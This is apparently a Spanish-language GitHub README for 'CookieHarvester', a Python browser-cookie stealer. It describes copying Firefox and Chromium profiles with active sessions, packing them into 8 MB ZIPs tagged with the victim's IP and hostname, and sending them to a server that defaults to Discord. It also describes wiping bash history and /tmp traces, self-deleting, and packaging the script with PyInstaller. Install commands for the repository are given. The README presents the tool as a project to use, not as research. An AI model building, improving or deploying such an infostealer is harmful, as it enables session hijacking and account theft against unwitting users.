# Proyecto

```
 ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝
██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗  
██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝  
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝

██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗ 
██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

**CookieHarvester** — Extrae perfiles de navegadores (Firefox/Chromium), los comprime en ZIP de 8 MB y los envía a un servidor configurado. Luego limpia rastros y se autodestruye (opcional).

![Status](https://img.shields.io/badge/status-en%20desarrollo-yellow)
![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.10+-blue)
![Stable](https://img.shields.io/badge/estable-SI-green)

---

## Tabla de Contenidos
- [Descripción](#descripción)
- [Características](#características)
- [Requisitos](#requisitos)
- [Instalación](#instalación)
- [Autor](#autor)

---

## Descripción

CookieHarvester copia los perfiles de navegadores con sesiones activas a `/tmp`, los divide en ZIP de máximo 8 MB y los envía a un servidor preconfigurado (por defecto Discord). Si falla un envío, reintenta hasta 3 veces. Al finalizar, borra todo rastro y puede autodestruirse (`AUTODESTRUIR = True`).

Requiere **Python 3.10+** y la librería `requests`. Si no está disponible, el script se elimina solo. Puede empaquetarse con PyInstaller para evitar dependencias.

---

## Características

- **Análisis:** Detecta el navegador predeterminado y copia perfiles con sesiones a `/tmp`.
- **Compresión:** Divide los perfiles en ZIP de 8 MB, nombrados con IP, hostname, navegador, fecha y orden.
- **Envío:** Envía los paquetes al servidor configurado. Reintenta hasta 3 veces si falla.
- **Limpieza:** Borra rastros en bash y `/tmp`. Se autodestruye si `AUTODESTRUIR = True`.

---

## Requisitos

- **Python 3.10+**
- **Librerías:** `os`, `sys`, `time`, `shutil`, `zipfile`, `tempfile`, `subprocess`, `socket`, `getpass`, `glob`, `traceback`, `math`, `datetime`, `requests`
- **SO compatible:** Linux (Mint, Fedora 44 KDE)

---

## Instalación

```bash
git clone https://github.com/Bankai-HackingDev/CookieHarvester.git
```
```bash
cd CookieHarvester
```

## Autor
- Github: `Bankai-HackingDev`
